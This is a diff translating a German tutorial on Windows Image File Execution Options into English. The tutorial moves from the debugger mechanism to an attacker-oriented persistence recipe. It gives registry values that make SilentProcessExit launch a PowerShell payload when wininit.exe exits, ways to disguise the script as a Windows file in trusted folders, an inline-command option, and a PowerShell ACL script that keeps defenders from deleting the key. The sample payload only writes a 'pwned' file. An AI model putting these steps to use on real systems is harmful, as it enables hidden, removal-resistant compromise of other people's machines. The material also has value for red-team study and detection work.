@@ -1,45 +1,57 @@
 # Image File Execution Options (IFEO)
 
-**Entstanden mit der Hile von KI (Claude)**
+## What is it?
+IFEO is a Windows feature originally designed for developers and debuggers — it was created for legitimate purposes. The name gives it away: it's about options that apply when an image file (i.e. an .exe) is executed.
 
-## Was ist das überhaupt?
-IFEO ist ein Feature von Windows, das ursprünglich für Entwickler und Debugger gedacht war – also für legitime Zwecke entstanden ist. Der Name verrät schon viel: Es geht um Optionen, die beim Ausführen einer Image-Datei (also einer .exe) greifen.
-Die Grundidee ist simpel: Ein Entwickler möchte ein Programm debuggen, sobald es startet – egal, wer es startet, egal aus welchem Kontext. Windows soll also automatisch den Debugger starten und das eigentliche Programm daran "anhängen". Das ist praktisch, weil man sonst den Debugger immer manuell an einen laufenden Prozess hängen müsste, was bei bestimmten Problemen (Race Conditions beim Start, z.B.) gar nicht funktioniert.
-## Woher kommt es?
-IFEO existiert seit den frühen NT-Versionen – also mindestens seit Windows NT 3.1 (Anfang der 90er). Es wurde von Microsoft als offizielles Debugging-Werkzeug eingeführt und ist bis heute Teil von Windows. Du findest es im Sysinternals-Umfeld dokumentiert, und Microsoft selbst schreibt offen darüber.
-Der Registry-Pfad, um den sich alles dreht:
+The core idea is simple: a developer wants to attach a debugger to a program the moment it starts — regardless of who starts it or from what context. Windows automatically launches the debugger and attaches the target program to it. This is useful because manually attaching a debugger to a running process doesn't work for certain problems (e.g. race conditions at startup).
+
+## Where does it come from?
+IFEO has existed since the early NT versions — at least since Windows NT 3.1 (early 1990s). Microsoft introduced it as an official debugging tool and it remains part of Windows to this day. It is documented in the Sysinternals ecosystem and Microsoft itself writes openly about it.
+
+The registry path everything revolves around:
+```
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
-## Wie funktioniert der Kern-Mechanismus?
-Wenn Windows eine .exe startet, schaut der Windows Loader in diesem Registry-Schlüssel nach, ob es einen Unterordner mit dem exakten Dateinamen der Executable gibt – also z.B. notepad.exe. Existiert dort ein Debugger-Wert, passiert folgendes:
-Windows startet nicht notepad.exe direkt, sondern startet stattdessen den im Debugger-Wert angegebenen Prozess – und übergibt den originalen Pfad zu notepad.exe als Kommandozeilenargument.
-Konkret: Wenn du
+```
+
+## How does the core mechanism work?
+When Windows launches an .exe, the Windows Loader checks this registry key for a subkey matching the exact filename of the executable — e.g. `notepad.exe`. If a `Debugger` value exists there, the following happens:
+
+Windows does not start `notepad.exe` directly. Instead, it starts the process specified in the `Debugger` value and passes the original path to `notepad.exe` as a command-line argument.
+
+Concretely: if you set
+```
 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe
-  Debugger = "C:\dbg\windbg.exe"
-setzt, und dann jemand Notepad startet, passiert intern:
+    Debugger = "C:\dbg\windbg.exe"
+```
+and someone then launches Notepad, Windows internally runs:
+```
 C:\dbg\windbg.exe "C:\Windows\System32\notepad.exe"
-Der Debugger bekommt Notepad als Argument und kann es kontrolliert starten.
-## Warum ist das aus Sicherheitsperspektive interessant?
-Jetzt kommt der entscheidende Punkt: Windows prüft nicht, ob der Debugger-Wert wirklich ein Debugger ist. Es ist nur ein Pfad zu einer Executable. Das heißt: Du kannst dort beliebige Programme eintragen.
-Außerdem greift der Mechanismus systemweit und für alle Benutzer – weil der Schlüssel unter HKLM liegt (also in der Hive, die Administratorrechte zum Schreiben braucht, aber beim Lesen für alle gilt).
-Das macht IFEO zu einem klassischen Persistence-Mechanismus für Angreifer:
+```
+The debugger receives Notepad as an argument and can start it in a controlled way.
 
-Kein neuer Prozess, der im Autostart auffällt
-Kein Scheduled Task
-Kein Service
-Stattdessen: Das Malware-Programm startet genau dann, wenn ein legitimes Programm gestartet wird – also zuverlässig und unauffällig
+## Why is this interesting from a security perspective?
+Here is the key point: Windows does not verify whether the `Debugger` value actually points to a debugger. It is just a path to an executable. That means you can put any program there.
 
-Ein klassisches Beispiel aus der Praxis (und aus Penetration Tests): Die Accessibility-Tools auf dem Windows-Sperrbildschirm. Programme wie sethc.exe (Sticky Keys) oder utilman.exe laufen ohne angemeldeten Benutzer, weil sie vom Sperrbildschirm aus erreichbar sind. Wenn man dort per IFEO eine cmd.exe einträgt, bekommt man eine Shell mit SYSTEM-Rechten – ohne Login. Das war jahrelang eine bekannte Technik (ATT&CK T1546.012).
+Furthermore, the mechanism applies system-wide and for all users — because the key lives under HKLM (the hive that requires administrator rights to write to, but is readable by everyone).
 
+This makes IFEO a classic persistence mechanism for attackers:
 
-## Was ist SilentProcessExit?
-SilentProcessExit funktioniert anders als der klassische Debugger-Wert und liegt an einer Stelle, die viele Defender-Scripts nicht auf dem Radar haben.
+- No new process showing up in an autostart list
+- No scheduled task
+- No service
+- Instead: the malware launches exactly when a legitimate program is started — reliably and inconspicuously
 
-Mit dem Debugger Wert greife ich vor der Prozess Ausführung aktiv ein und kann den Start des Programms beeinträchtigen und das System bei seiner Arbeit stören.
-Mit SilentProcessExit wird der Prozess auf jeden Fall ausgeführt fehlerfrei. Wenn ein Fehler in meiner Arbeit ist, dann wird mein Teil nicht ausgeführt - Pech für mich - aber sonst läuft alles weiter.
+A classic real-world example (and a penetration testing staple): the accessibility tools on the Windows lock screen. Programs like `sethc.exe` (Sticky Keys) or `utilman.exe` run without a logged-in user because they are reachable from the lock screen. Registering `cmd.exe` via IFEO there gives you a SYSTEM-level shell without any login. This was a well-known technique for years (ATT&CK T1546.012).
 
+## What is SilentProcessExit?
+SilentProcessExit works differently from the classic `Debugger` value and lives in a place many defender scripts do not monitor.
 
-## Wo verstecken?
-Die Boot-Reihenfolge in Windows (vereinfacht)
+With the `Debugger` value, you actively intervene before the process runs and can disrupt the program's startup — potentially disturbing system operation.
+
+With SilentProcessExit, the target process always runs cleanly. If there is a bug in the attacker's code, only the attacker's payload fails to execute — everything else continues normally.
+
+## Where to hide it?
+The Windows boot sequence (simplified):
 ```
 BIOS/UEFI
     ↓
@@ -47,112 +59,126 @@ Bootloader (bootmgr)
     ↓
 Windows Kernel + HAL
     ↓
-smss.exe  ← Session Manager, erster User-Mode Prozess
+smss.exe  ← Session Manager, first user-mode process
     ↓
 csrss.exe + wininit.exe
     ↓
-services.exe  ← startet alle Auto-Start Dienste
+services.exe  ← starts all auto-start services
     ↓
 winlogon.exe
     ↓
-LogonUI / userinit.exe  ← erst hier kommt Login
+LogonUI / userinit.exe  ← login happens here
 ```
 
 **wininit.exe**
-- Startet sehr früh (vor dem Login)
-- Erledigt seine Aufgabe (initialisiert Session 0, startet services.exe, lsass.exe, winlogon.exe)
-- Beendet sich danach
+- Starts very early (before login)
+- Completes its job (initialises Session 0, starts `services.exe`, `lsass.exe`, `winlogon.exe`)
+- Then exits
 
-Das ist ein klassisches SilentProcessExit-Target in der Red-Team-Literatur.
+This makes it a classic SilentProcessExit target in red team literature.
 
-## Wie es funktioniert
-### Die zwei Schlüssel
-Schritt 1 – unter IFEO, den kennst du schon:
+## How it works
+
+### The two keys
+
+**Step 1 — under IFEO (already familiar):**
 ```
 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe
     GlobalFlag = 0x200  (REG_DWORD)
 ```
-Dieser GlobalFlag-Wert mit 0x200 bedeutet: "Überwache diesen Prozess auf sein Ende." Er aktiviert den Mechanismus überhaupt erst.
-Schritt 2 – an einer neuen Stelle:
+The `GlobalFlag` value `0x200` means: "Monitor this process for its exit." It is what activates the mechanism in the first place.
+
+**Step 2 — in a new location:**
 ```
 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\wininit.exe
-    MonitorProcess = "C:\pfad\zu\deinem\script.exe"
+    MonitorProcess = "C:\path\to\your\script.exe"
     ReportingMode  = 0x1  (REG_DWORD)
 ```
-MonitorProcess ist dein Payload. ReportingMode = 1 sagt Windows: "Starte diesen Prozess, statt nur einen Dump zu schreiben."
-### Das Zusammenspiel
-```
-wininit.exe beendet sich
-      ↓
-Windows Kernel prüft: GlobalFlag 0x200 gesetzt?
-      ↓ ja
-Windows schaut in SilentProcessExit\wininit.exe
-      ↓
-startet MonitorProcess
-```
-### Der Aufruf vom Skript
-MonitorProcess erwartet eine .exe also muss das Skript so aufgerufen werden, dass es wie eine .exe aussieht.
-```
-MonitorProcess = "powershell.exe -ExecutionPolicy Bypass -File C:\pfad\script.ps1"
-```
-Kkeine externen Tools, nur Windows-Bordmittel.
+`MonitorProcess` is your payload. `ReportingMode = 1` tells Windows: "Launch this process instead of just writing a dump."
 
-### Inhalt vom Skript
+### How they interact
 ```
+wininit.exe exits
+      ↓
+Windows Kernel checks: GlobalFlag 0x200 set?
+      ↓ yes
+Windows reads SilentProcessExit\wininit.exe
+      ↓
+Launches MonitorProcess
+```
+
+### Calling the script
+`MonitorProcess` expects an executable, so the script must be called in a way that looks like one:
+```
+MonitorProcess = "powershell.exe -ExecutionPolicy Bypass -File C:\path\script.ps1"
+```
+No external tools — only built-in Windows components.
+
+### Script contents
+```powershell
 Set-Content -Path "C:\Users\Public\Documents\pwned.txt" -Value "Pwn3d" -Encoding UTF8
 ```
-### Das Versteck
-Windows hat Ordner die:
-- Bereits hunderte von .ps1 oder Systemdateien enthalten
-- Von Defender-Scripts typischerweise als "vertrauenswürdig" behandelt werden
-- Tief verschachtelt sind
 
-Zum Beispiel:
+### Hiding the payload
+
+**Option A: Drop a file**
+
+Windows has folders that:
+- Already contain hundreds of `.ps1` or system files
+- Are typically treated as trusted by defender scripts
+- Are deeply nested
+
+For example:
 ```
 C:\Windows\System32\
 C:\Windows\SysWOW64\
 C:\ProgramData\Microsoft\
 ```
-Die Datei selbst tarnen:
+
+Disguise the file itself:
 ```
-meinScript.ps1          ← offensichtlich
-versus
-WerFaultSecure.ps1      ← klingt nach Windows
+myScript.ps1          ← obvious
+vs.
+WerFaultSecure.ps1    ← sounds like Windows
 ```
-Dateiendung verschleiern
-Du kannst das Script anders benennen und PowerShell trotzdem damit aufrufen:
+
+Obscure the file extension — you can rename the script and PowerShell will still execute it:
 ```
 WerFaultSecure.log
 WerFaultSecure.dat
 ```
-
 ```
-powershellpowershell.exe -ExecutionPolicy Bypass -File "C:\Windows\Temp\WerFaultSecure.dat"
+powershell.exe -ExecutionPolicy Bypass -File "C:\Windows\Temp\WerFaultSecure.dat"
 ```
-PowerShell interessiert die Endung nicht – es führt den Inhalt aus.
+PowerShell ignores the extension and executes the contents.
 
-
-
-### Der Schutz gegen Löschen
-**Registry-ACLs**  Das ist der eigentliche Schutz:
+**Option B: Inline command in the registry value**
 ```
-Defender findet deinen SilentProcessExit-Eintrag
+MonitorProcess = "powershell.exe -ExecutionPolicy Bypass -Command \"Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Encoding UTF8\""
+```
+
+### Protection against deletion
+
+**Registry ACLs** — this is the real protection:
+```
+Defender finds your SilentProcessExit entry
     ↓
-Versucht ihn zu löschen
+Tries to delete it
     ↓
-Zugriff verweigert
+Access denied
 ```
-Wenn der Defender deinen Registry-Schlüssel nicht löschen kann, ist es egal ob er ihn findet.
-#### Wie funktioniert das konkret?
-Mit PowerShell kannst du die ACL eines Registry-Schlüssels so setzen, dass nur SYSTEM schreiben darf:
-```
+If the defender cannot delete your registry key, it does not matter whether it finds it.
+
+#### How it works in practice
+With PowerShell you can set the ACL of a registry key so that only SYSTEM is allowed to write:
+```powershell
 $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\wininit.exe"
 $acl = Get-Acl $path
 
-# Alle bestehenden Regeln entfernen
+# Remove all existing rules
 $acl.SetAccessRuleProtection($true, $false)
 
-# Nur SYSTEM darf lesen und schreiben
+# Only SYSTEM gets full control
 $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
     "SYSTEM",
     "FullControl",
@@ -161,24 +187,24 @@ $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
 $acl.AddAccessRule($rule)
 Set-Acl -Path $path -AclObject $acl
 ```
-Jetzt kann der Defender-Prozess – selbst als Administrator – den Schlüssel nicht löschen.
+The defender process — even running as Administrator — can now no longer delete the key.
 
-**Hinweis**
+**Note:**
 ```
-SYSTEM  → kann ACLs ignorieren (SeDebugPrivilege, SeTakeOwnershipPrivilege)
-Admin   → kann Ownership übernehmen → dann ACL anpassen → dann löschen
+SYSTEM  → can override ACLs (SeDebugPrivilege, SeTakeOwnershipPrivilege)
+Admin   → can take ownership → then modify the ACL → then delete
 ```
-ACLs sind also kein absoluter Schutz, sondern nur eine Hürde.
+ACLs are therefore not absolute protection, only an obstacle.
 
-Selbst im schlechtesten Fall – Defender findet alles – schützt die ACL den Eintrag solange der Defender nicht explizit Ownership übernimmt.
+Even in the worst case — the defender finds everything — the ACL protects the entry as long as the defender does not explicitly take ownership:
 ```
-Defender findet Eintrag + kann nicht löschen (ACL)
+Defender finds entry + cannot delete it (ACL)
     ↓
 Reboot
     ↓
-SilentProcessExit triggert trotzdem
+SilentProcessExit triggers anyway
     ↓
-pwned.txt wird erstellt
+pwned.txt is created
     ↓
-Attacker gewinnt
+Attacker wins
 ```
